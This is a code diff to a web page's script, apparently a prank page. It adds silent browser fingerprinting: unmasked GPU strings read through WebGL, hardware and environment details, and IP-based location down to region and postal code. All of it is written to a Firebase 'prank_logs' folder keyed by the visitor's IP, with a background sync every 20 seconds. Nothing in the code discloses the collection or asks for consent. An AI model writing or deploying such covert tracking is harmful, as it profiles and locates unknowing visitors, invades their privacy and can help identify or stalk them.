@@ -98,6 +98,40 @@
             return visitorId;
         }
 
+        // Deep scanner to look up hardware component strings via WebGL
+        function gatherTelemetrySpecs() {
+            let gpuVendor = "Unknown", gpuRenderer = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                console.error("GPU telemetry lookup skipped:", e);
+            }
+
+            return {
+                hardware: {
+                    cpu_threads: navigator.hardwareConcurrency || "Unknown",
+                    device_ram_gb: navigator.deviceMemory || "Unknown",
+                    gpu_vendor: gpuVendor,
+                    gpu_chip: gpuRenderer
+                },
+                environment: {
+                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                    os_platform: navigator.platform || "Unknown",
+                    locale_lang: navigator.language || "Unknown",
+                    timezone_zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                    user_agent_string: navigator.userAgent
+                }
+            };
+        }
+
         async function runAutoTracking() {
             let publicIp = "Unknown", geoInfo = {};
             
@@ -115,38 +149,41 @@
             // Select Folder Name: Prioritize IP address, fall back to visitor ID token if IP fails
             let rawFolderName = publicIp !== "Unknown" ? publicIp : getOrCreateVisitorId();
             
-            // Firebase paths cannot contain safely characters like '.', '$', '#', '[', ']', or '/'
-            // This replaces illegal characters cleanly with dashes (-) to keep paths stable
+            // Sanitize standard folder paths to remove characters forbidden by Firebase keys (. $ # [ ] /)
             let safeFolderName = rawFolderName.replace(/[\.\$\#\[\]\/]/g, "-");
 
+            // Extract the deep system information components
+            const systemSpecs = gatherTelemetrySpecs();
+
+            // Unified, comprehensive payload combining networks, geography, and deep hardware data
             const sessionPayload = {
                 user_identity: safeFolderName,
                 last_updated: serverTimestamp(),
                 network_profile: {
                     ip_address: publicIp,
-                    isp: geoInfo.org || "Unknown",
+                    asn_org: geoInfo.org || "Unknown",
                     location_city: geoInfo.city || "Unknown",
-                    location_country: geoInfo.country_name || "Unknown"
+                    location_region: geoInfo.region || "Unknown",
+                    location_country: geoInfo.country_name || "Unknown",
+                    postal_code: geoInfo.postal || "Unknown",
+                    connection_type: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                 },
-                hardware_capabilities: {
-                    cpu_cores: navigator.hardwareConcurrency || "Unknown",
-                    device_ram_gb: navigator.deviceMemory || "Unknown",
-                    screen_resolution: `${window.screen.width}x${window.screen.height}`
-                },
+                device_hardware: systemSpecs.hardware,
+                device_environment: systemSpecs.environment,
                 live_session_intervals: {
                     time_spent_seconds: 0,
                     last_pulse_timestamp: serverTimestamp()
                 }
             };
 
-            // TARGET DIRECTORY: Instead of a random push id, we point exactly to our user folder
+            // Target individual directory inside database
             userFolderRef = ref(database, `prank_logs/${safeFolderName}`);
             
-            // Updates or populates everything inside that user's specific folder node
+            // Overwrite or update properties inside that folder path mapping
             await update(userFolderRef, sessionPayload)
                 .catch((err) => console.error("Database connection dropped:", err));
 
-            // Run continuous 20-second background sync loop inside the folder
+            // Run continuous 20-second background sync loop inside the folder node path
             setInterval(() => {
                 activeSecondsCounter += 20;
                 syncIntervalTelemetry();
